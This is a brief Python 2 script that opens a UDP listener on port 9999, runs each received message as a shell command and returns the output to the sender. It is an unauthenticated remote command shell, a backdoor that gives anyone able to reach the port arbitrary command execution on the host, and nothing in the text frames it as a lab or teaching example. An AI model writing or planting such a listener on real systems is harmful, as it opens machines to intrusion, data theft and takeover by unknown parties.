#!/usr/bin/env python2


import  socket
import   commands

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(("",9999))

while True:
	x=s.recvfrom(100)
	data=x[0]
	clientaddr=x[1]
	if  data  ==  'exit' :
		s.close()
	else :
		r=commands.getoutput(data)

		s.sendto(r,clientaddr)




s.close()
